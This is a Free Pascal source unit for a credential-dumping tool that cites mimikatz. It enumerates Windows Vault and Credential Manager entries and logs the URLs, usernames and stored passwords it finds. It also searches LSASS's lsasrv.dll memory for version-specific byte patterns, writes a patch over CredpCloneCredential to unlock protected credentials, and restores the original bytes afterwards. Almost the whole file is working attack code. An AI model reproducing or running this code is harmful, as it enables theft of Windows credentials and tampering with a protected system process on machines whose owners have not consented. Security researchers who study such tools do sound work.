unit uvaults;

{$mode delphi}

interface

{
$VaultSchema = @{
        ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
        ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
        ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
        ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
        ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
        ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
        ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
        ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
        ([Guid] '00000000-0000-0000-0000-000000000000') = $null
}

uses
  Classes, SysUtils,windows,utils,upsapi,umemory,ucryptoapi;

type VAULT_SCHEMA_ELEMENT_ID =(
    ElementId_Illegal = $0,
    ElementId_Resource = $1,
    ElementId_Identity = $2,
    ElementId_Authenticator = $3,
    ElementId_Tag = $4,
    ElementId_PackageSid = $5,
    ElementId_AppStart = $64,
    ElementId_AppEnd = $2710);

Type VAULT_ELEMENT_TYPE =(
    ElementType_Undefined = $ffffffff,
    ElementType_Boolean = $0,
    ElementType_Short = $1,
    ElementType_UnsignedShort = $2,
    ElementType_Integer = $3,
    ElementType_UnsignedInteger = $4,
    ElementType_Double = $5,
    ElementType_Guid = $6,
    ElementType_String = $7,
    ElementType_ByteArray = $8,
    ElementType_TimeStamp = $9,
    ElementType_ProtectedArray = $a,
    ElementType_Attribute = $b,
    ElementType_Sid = $c,
    ElementType_Last = $d );

{
Type _VAULT_VARIANT=record
 veType : VAULT_ELEMENT_TYPE;
 Unk1 : dword;
 data : pointer;
End;
}


//see _VAULT_ITEM_DATA  in https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_vault.h
Type _VAULT_ITEM_ELEMENT=record  //similar to _VAULT_ITEM_DATA
 SchemaElementId : VAULT_SCHEMA_ELEMENT_ID;
 Unk0 : dword;
 //ItemValue : _VAULT_VARIANT
 veType : VAULT_ELEMENT_TYPE;
 Unk1 : dword;
 data : pointer;
End;

Type _VAULT_ITEM_ELEMENT_BYTEARRAY=record  //similar to _VAULT_ITEM_DATA
 SchemaElementId : VAULT_SCHEMA_ELEMENT_ID;
 Unk0 : dword;
 //ItemValue : _VAULT_VARIANT
 veType : VAULT_ELEMENT_TYPE;
 Unk1 : dword;
 Length:DWORD;
 Value:PBYTE;
End;

type _VAULT_BYTE_BUFFER =record
	 Length:DWORD;
	 Value:PBYTE;
        end;
PVAULT_BYTE_BUFFER=^_VAULT_BYTE_BUFFER;



type _VAULT_ITEM_7 =record
	 SchemaId:GUID;
	 FriendlyName:pointer; //PWSTR;
	 Ressource:pointer; //or pointer
	 Identity:pointer; //PVAULT_ITEM_DATA;
	 Authenticator:pointer; //PVAULT_ITEM_DATA;
	 PackageSid:pointer; //PVAULT_ITEM_DATA;
	 LastWritten:FILETIME;
	 Flags:DWORD;
	 cbProperties:DWORD;
	 Properties:pointer; //PVAULT_ITEM_DATA;
end;
PVAULT_ITEM_7=^_VAULT_ITEM_7;


type _VAULT_ITEM_8 =record
	 SchemaId:GUID;
	 FriendlyName:pointer; //PWSTR;
	 Ressource:pointer; //or pointer
	 Identity:pointer; //PVAULT_ITEM_DATA;
	 Authenticator:pointer; //PVAULT_ITEM_DATA;
	 PackageSid:pointer; //PVAULT_ITEM_DATA;
	 LastWritten:FILETIME;
	 Flags:DWORD;
	 cbProperties:DWORD;
	 Properties:pointer; //PVAULT_ITEM_DATA;
end;
PVAULT_ITEM_8=^_VAULT_ITEM_8;

var
VAULTENUMERATEVAULTS:function ( unk0:DWORD; cbVault:PDWORD; out vaultguids:LPGUID):ntstatus;stdcall;
VAULTFREE:function (memory:pvoid):ntstatus;
//guid or lpguid will both work
VAULTOPENVAULT:function (vaultGUID:lpguid; unk0:dword; out vault:phandle):ntstatus;stdcall;
VAULTCLOSEVAULT:function (vault:PHANDLE):ntstatus;stdcall;
//VAULTGETINFORMATION:function ( vault:handle; unk0:dword;  informations:pointer{PVAULT_INFORMATION}):ntstatus;stdcall;
VAULTENUMERATEITEMS:function (vault:phandle; unk0:dword;  cbItems:PDWORD; out items:PVOID):ntstatus;stdcall;
//VAULTENUMERATEITEMTYPES:function (vault:handle; unk0:dword; cbItemTypes:PDWORD;itemTypes:PVAULT_ITEM_TYPE):ntstatus;stdcall;
VAULTGETITEM7:function (vault:phandle; SchemaId:pointer; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; hWnd:pointer;  Flags:dword;  out pItem:pointer {PVAULT_ITEM_7}):ntstatus;stdcall;
{private static extern uint VaultGetItem8(IntPtr pVaultHandle, IntPtr pSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pPackageSid, IntPtr hwndOwner, uint dwFlags, out IntPtr ppItems);}
VAULTGETITEM8:function (vault:phandle; SchemaId:pointer{pointer/GUID}; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; PackageSid:pointer{PVAULT_ITEM_DATA}; hWnd:pointer{hwnd};  Flags:dword;  out pItem:pointer {pointer/PVAULT_ITEM_8}):ntstatus;stdcall;

function VaultInit:boolean;
function VaultEnum:boolean;
function patch_CredpCloneCredential(pid:dword):boolean;
function CredEnum:boolean;

implementation


//
const
  CRED_TYPE_GENERIC                 = 1;
  CRED_TYPE_DOMAIN_PASSWORD         = 2;
  CRED_TYPE_DOMAIN_CERTIFICATE      = 3;
  CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4;
  CRED_TYPE_MAXIMUM                 = 5;  // Maximum supported cred type
  CRED_TYPE_MAXIMUM_EX              = CRED_TYPE_MAXIMUM + 1000;  // Allow new applications to run on old OSes

  function CredReadW(TargetName: LPCWSTR; Type_: DWORD; Flags: DWORD; var Credential: PCREDENTIALW): BOOL; stdcall; external 'advapi32.dll';
  function CredEnumerateW(Filter: LPCWSTR; Flags: DWORD; out Count: DWORD; out Credential: pointer {PCredentialArray}): BOOL; stdcall; external 'advapi32.dll';
  Procedure CredFree(Buffer:pointer); stdcall; external 'advapi32.dll';
//



  function CredEnum:boolean;
var
  Credentials: array of pointer; //PCredentialArray;
  ptr:pointer;
  Credential: PCREDENTIALW;
  UserName: WideString;
  i: integer;
  dwCount: DWORD;
  //bytes:array[0..1023] of byte;
begin
  result:=false;
  //setlength(Credentials ,1024);
    if CredEnumerateW(nil{PChar('TERM*')}, 0, dwCount, Credentials) then
    begin
      result:=true;
      writeln(dwcount);
      //ptr:=credentials;
      for i:= 0 to dwCount - 1  do
        begin
          log('*************************************',1);
          try decodecred (Credentials[i]);except end;

          //inc(ptr,sizeof(pointer));
            {
            if CredReadW(PCREDENTIALW(Credentials[i]).TargetName, PCREDENTIALW(Credentials[i]).Type_, 0, Credential) then
            begin
              //log(widestring(Credential.UserName));
              UserName:= Credential.UserName;
              log(PCREDENTIALW(Credentials[i]).TargetName + ' :: ' + UserName + ' >> ' + IntToStr(PCREDENTIALW(Credentials[i]).Type_));
              log(IntToStr(Credential.CredentialBlobSize));
            end; // if CredReadW
            }
        end; //for i:= 0 to dwCount - 1  do
    try credfree(Credentials);except end;
    end //if CredEnumerateW
    else log('CredEnumerateW failed, '+inttostr(getlasterror));
end;


function VaultInit:boolean;
var
  hVaultLib:thandle;
  bStatus:boolean = FALSE;
begin

    hVaultLib := LoadLibrary('vaultcli.dll');

    if (hVaultLib > 0) then
    begin
        @VaultEnumerateItems := GetProcAddress(hVaultLib, 'VaultEnumerateItems');
        @VaultEnumerateVaults := GetProcAddress(hVaultLib, 'VaultEnumerateVaults');
        @VaultFree := GetProcAddress(hVaultLib, 'VaultFree');
        @VAULTGETITEM7 := GetProcAddress(hVaultLib, 'VaultGetItem');
        @VAULTGETITEM8 := GetProcAddress(hVaultLib, 'VaultGetItem');
        @VaultOpenVault := GetProcAddress(hVaultLib, 'VaultOpenVault');
        @VaultCloseVault := GetProcAddress(hVaultLib, 'VaultCloseVault');

        bStatus := (@VaultEnumerateVaults <> nil)
            and (@VaultFree <> nil)
            and (@VAULTGETITEM7 <> nil)
            and (@VAULTGETITEM8 <> nil)
            and (@VaultOpenVault <> nil)
            and (@VaultCloseVault <> nil)
            and (@VaultEnumerateItems <> nil);
    end;

    result:= bStatus;
    if result=false then log('vault init=false') else log('vault init=true')
end;

//check against vaultcmd

function VaultEnum:boolean;
var
  i,j,k,cbvaults,cbItems:dword;
  //vaults:array [0..254] of lpguid;
  status:NTStatus;
  //hvault:handle;
  hvault:phandle;
  //items:array[0..254] of pvoid;
  pvaults,pitems,ptr,ptr2:pointer;
  pitem8:pointer ;
  //vi:_VAULT_ITEM_8;
  VIE:_VAULT_ITEM_ELEMENT;
  VIE_BYTE:_VAULT_ITEM_ELEMENT_BYTEARRAY ;
  bytes,output:tbytes;
begin
    result:=false;
    //fillchar(vaults,sizeof(vaults),0);
    //status := VaultEnumerateVaults(0, @cbVaults, @vaults[0]);
    pvaults:=nil;
    status := VaultEnumerateVaults(0, @cbVaults, pvaults);
		if(status = 0) then
                begin
                ptr:=pvaults;
                log('VaultEnumerateVaults OK, '+inttostr(cbvaults));
                for i:= 0 to cbVaults-1 do
                    begin
                    log('*************************************************',1);
                    log('item:'+inttostr(i)+ ' GUID:'+GUIDToString ( tguid(ptr^)),1);
                    begin
                    //if VaultOpenVault(vaults[i]^, 0, @hVault)=0 then
                    if VaultOpenVault(@tguid(ptr^), 0, hVault)=0 then
                       begin
                       log('VaultOpenVault OK');
                       //if VaultEnumerateItems(hVault, $200, @cbItems, @items[0])=0 then
                       pitems:=nil;
                       if VaultEnumerateItems(hVault, $200, @cbItems, pitems)=0 then
                          begin
                          log('VaultEnumerateItems OK, '+inttostr(cbitems));
                          if cbitems>0 then
                          begin
                          ptr2:=pitems;
                          for j:=0 to cbItems -1 do
                              begin
                              log('SchemaId:'+GUIDToString (PVAULT_ITEM_8(ptr2).SchemaId ),1 );
                              //log('cbProperties:'+inttostr(PVAULT_ITEM_8(ptr2).cbProperties)) ;
                              log(inttostr(j)+' FriendlyName:'+pwidechar(PVAULT_ITEM_8(ptr2).FriendlyName),1 );
                              CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Ressource ,sizeof(vie));
                              log('URL:'+pwidechar(vie.data),1);
                              CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Identity  ,sizeof(vie));
                              log('User:'+pwidechar(vie.data),1);
                              pitem8 :=nil;
                              if pos('6.1',winver)>0
                                 then status:= VaultGetItem7(hVault, pointer(@PVAULT_ITEM_7(ptr2).SchemaId), PVAULT_ITEM_7(ptr2).Ressource, PVAULT_ITEM_7(ptr2).Identity, 0, 0, pitem8 )
                                 else status:= VaultGetItem8(hVault, pointer(@PVAULT_ITEM_8(ptr2).SchemaId), PVAULT_ITEM_8(ptr2).Ressource, PVAULT_ITEM_8(ptr2).Identity, PVAULT_ITEM_8(ptr2).PackageSid,0, 0, pitem8 );
                              if status=0 then
                                 begin
                                     result:=true;
                                     log('GetItem OK');
                                     if pos('6.1',winver)>0
                                        then CopyMemory (@vie,PVAULT_ITEM_7(pItem8).Authenticator  ,sizeof(vie))
                                        else CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
                                     if vie.veType=ElementType_String then
                                           begin
                                           log('Authenticator:'+pwidechar(vie.data),1);
                                           end;
                                    //log('veType:'+inttostr(integer(vie.ItemValue.veType)));
                                    if vie.veType=ElementType_ByteArray then
                                           begin
                                           CopyMemory (@VIE_BYTE,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(VIE_BYTE));
                                           log('Length:'+inttostr(nativeuint(VIE_BYTE.Length )),1 );
                                           //log('Data:'+inttohex(nativeuint(VIE_BYTE.Value ),8) );
                                           if VIE_BYTE.Length>0 then
                                               begin
                                               setlength(bytes,VIE_BYTE.Length);
                                               copymemory(@bytes[0],VIE_BYTE.Value,VIE_BYTE.Length);
                                               for k:=0 to VIE_BYTE.Length do write(bytes[k]);log('');
                                               //dpapi is used for sure - entropy?
                                               //CryptUnProtectData_(bytes,output);
                                               end;
                                           end;
                                    VaultFree(pItem8);
                                    end
                                    else log('GetItem NOT OK, '+inttostr(status));

                              inc(ptr2,sizeof(_VAULT_ITEM_8));
                              end; //for j
                              end; //if cbitems>0 then
                          VaultFree(pitems);
                          end; //VaultEnumerateItems
                       VaultCloseVault(hVault);
                       end//VaultOpenVault
                       else log('VaultOpenVault NOT OK, '+inttostr(getlasterror));
                    end; //if nativeuint(vaults[i])<>0 then
                    inc(ptr,sizeof(tguid));
                    end; //for i
                VaultFree(pvaults);
                end //VaultEnumerateVaults
                else log('VaultEnumerateVaults NOT OK')

end;

function Init_Pattern(var offset:shortint):tbytes;
const
  PTRN_WN60_CredpCloneCredential:array [0..7] of byte =($44, $8b, $ea, $41, $83, $e5, $01, $75);
  PTRN_WN63_CredpCloneCredential:array [0..5] of byte =($45, $8b, $f8, $44, $23, $fa);
  PTRN_WN10_1607_CredpCloneCredential:array [0..7] of byte =($45, $8b, $e0, $41, $83, $e4, $01, $75);
  PTRN_WN10_1703_CredpCloneCredential:array [0..7] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $75);
  PTRN_WN10_1803_CredpCloneCredential:array [0..7] of byte =($45, $8b, $fe, $41, $83, $e7, $01, $75);
  PTRN_WN10_1809_CredpCloneCredential:array [0..8] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $0f, $84);
  PTRN_WN10_1903_CredpCloneCredential:array [0..8] of byte =($45, $8B, $E6, $41, $83, $E4, $01, $0F, $84);
  PTRN_WN10_1909_CredpCloneCredential:array [0..8] of byte =($45, $8B, $E6, $41, $83, $E4, $01, $0F, $84);
  PTRN_WN10_2004_CredpCloneCredential:array [0..8] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $0f, $84);
  //
  PTRN_WN60_CredpCloneCredential_x86:array [0..7] of byte =($89, $4d, $18, $83, $65, $18, $01, $75);
var
  pattern:array of byte;
begin

  if LowerCase (osarch )='amd64' then
     begin
     if copy(winver,1,3)='6.0' then
         begin
         setlength(pattern,length(PTRN_WN60_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN60_CredpCloneCredential[0],length(PTRN_WN60_CredpCloneCredential));
         offset:=7;
         end;
     if copy(winver,1,3)='6.1' then //same as 6.0 ...
         begin
         setlength(pattern,length(PTRN_WN60_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN60_CredpCloneCredential[0],length(PTRN_WN60_CredpCloneCredential));
         offset:=7;
         end;
     if copy(winver,1,3)='6.3' then
         begin
         setlength(pattern,length(PTRN_WN63_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN63_CredpCloneCredential[0],length(PTRN_WN63_CredpCloneCredential));
         offset:=6;
         end;
     if (pos('-1507',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN63_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN63_CredpCloneCredential[0],length(PTRN_WN63_CredpCloneCredential));
         offset:=6;
         end;
     if (pos('-1607',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_1607_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_1607_CredpCloneCredential[0],length(PTRN_WN10_1607_CredpCloneCredential));
         offset:=7;
         end;
     if (pos('-1703',winver)>0) or (pos('-1709',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_1703_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_1703_CredpCloneCredential[0],length(PTRN_WN10_1703_CredpCloneCredential));
         offset:=7;
         end;
     if (pos('-1803',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_1803_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_1803_CredpCloneCredential[0],length(PTRN_WN10_1803_CredpCloneCredential));
         offset:=7;
         end;
     if (pos('-1809',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_1809_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_1809_CredpCloneCredential[0],length(PTRN_WN10_1809_CredpCloneCredential));
         offset:=7;
         end;
     if (pos('-1903',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_1903_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_1903_CredpCloneCredential[0],length(PTRN_WN10_1903_CredpCloneCredential));
         offset:=7;
         end;
     if (pos('-1909',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_1909_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_1909_CredpCloneCredential[0],length(PTRN_WN10_1909_CredpCloneCredential));
         offset:=7;
         end;
     if (pos('-2004',winver)>0) then
         begin
         setlength(pattern,length(PTRN_WN10_2004_CredpCloneCredential));
         CopyMemory (@pattern[0],@PTRN_WN10_2004_CredpCloneCredential[0],length(PTRN_WN10_2004_CredpCloneCredential));
         offset:=7;
         end;
     end;
     if LowerCase (osarch )='x86' then
     begin
     if (copy(winver,1,3)='6.0') or (copy(winver,1,3)='6.1') then
         begin
         setlength(pattern,length(PTRN_WN60_CredpCloneCredential_x86));
         CopyMemory (@pattern[0],@PTRN_WN60_CredpCloneCredential_x86[0],length(PTRN_WN60_CredpCloneCredential_x86));
         offset:=7;
         end;
     end;
result:=pattern;
end;


function patch_CredpCloneCredential(pid:dword):boolean;
const
  PATC_WALL_CredpCloneCredentialJmpShort:array[0..0] of byte=($eb);
  //for 2k3, 10.1507, 10.1809
  PATC_WN64_CredpCloneCredentialJmpShort:array[0..5] of byte=($90, $90, $90, $90, $90, $90);

var
  module:string='lsasrv.dll'; //dd lsasrv!CredpCloneCredential
  dummy:string;
  hprocess:thandle;
  after,backup:array of byte; //array[0..0] of byte;
  read:cardinal;
  offset:nativeuint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  result:=false;
  if pid=0 then begin log('pid=0');exit;end;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     //nothing needed here
     if (pos('-1809',winver)>0) or (pos('-1903',winver)>0) or (pos('-1909',winver)>0) or (pos('-2004',winver)>0) then
        begin
        setlength(after,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
        setlength(backup,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
        copymemory(@after[0],@PATC_WN64_CredpCloneCredentialJmpShort[0],sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
        end
        else
        begin
        setlength(after,sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
        setlength(backup,sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
        copymemory(@after[0],@PATC_WALL_CredpCloneCredentialJmpShort[0],sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
        end;
     end;
  if (lowercase(osarch)='x86') then
     begin
        setlength(after,sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
        setlength(backup,sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
        copymemory(@after[0],@PATC_WALL_CredpCloneCredentialJmpShort[0],sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
     end;

  pattern:=Init_Pattern(patch_pos ) ;

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  if search_module_mem (pid,module,pattern,offset)=false then
     begin
     log('search_module_mem NOT OK');
     exit;
     end;
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                 if ReadMem  (hprocess,offset+patch_pos,backup) then
                                   begin
                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2));
                                   if WriteMem(hprocess,offset+patch_pos,after)=true then
                                        begin
                                        log('patch0 ok',0);
                                        try
                                        log('***************************************',0);
                                        try
                                        if credenum //do something
                                           then begin log('enum OK',0);result:=true;end
                                           else log('enum NOT OK',1);
                                        except end;
                                        log('***************************************',0);
                                        finally //we really do want to patch back
                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch1 ok') else log('patch1 failed');
                                        //should we read and compare before/after?
                                        end;
                                        end
                                        else log('patch0 failed',1);
                                   end; //if ReadMem
                                 end;  //if offset<>0
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
       closehandle(hprocess);
       end;//if openprocess...

end;

end.

